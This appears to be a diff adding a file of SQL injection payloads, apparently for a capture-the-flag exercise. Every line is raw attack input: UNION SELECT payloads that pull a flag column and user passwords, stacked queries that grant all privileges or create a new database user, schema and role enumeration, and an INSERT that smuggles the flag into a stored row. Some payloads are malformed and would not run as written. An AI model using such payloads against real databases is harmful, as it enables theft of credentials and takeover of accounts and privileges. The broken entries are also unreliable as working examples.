@@ -1,0 +1,22 @@
+' UNION SELECT flag_column02303 FROM flag_table09172-- 
+' GRANT ALL ON example_database.* TO 'example_user'@'%' WITH GRANT OPTION-- 
+
+'; GRANT ALL ON db.* TO 'ctf'@'%' WITH GRANT OPTION-- 
+
+
+' UNION SELECT username AS (SELECT passwd FROM users) FROM users-- 
+' UNION SELECT (SELECT passwd FROM users) FROM users-- 
+' UNION SELECT (SELECT flag_column02303 FROM flag_table09172) FROM users-- 
+
+
+' UNION SELECT (GRANT ALL ON db.* TO 'ctf'@'%' WITH GRANT OPTION) FROM users UNION SELECT flag_column02303 FROM flag_table09172--  
+
+' UNION SELECT (GRANT ALL PRIVILEGES ON *.* TO 'ctf'@'localhost') FROM users UNION SELECT flag_column02303 FROM flag_table09172-- 
+
+'; GRANT ALL PRIVILEGES ON *.* TO 'ctf'@'localhost'; SELECT flag_column02303 FROM flag_table09172--
+
+'; CREATE USER 'sample'@'localhost' ATTRIBUTE '{"attr1": "val1", "attr2": "val2"}';-- 
+' UNION SELECT USER FROM INFORMATION_SCHEMA.USER_ATTRIBUTES WHERE USER='ctf' AND HOST='localhost';-- 
+' UNION SELECT ROLE_NAME FROM INFORMATION_SCHEMA.ENABLED_ROLES;-- 
+
+'; INSERT INTO users (username,passwd,quotes) VALUES ("testuser1","testpass1",(SELECT flag_column02303 FROM flag_table09172))-- 
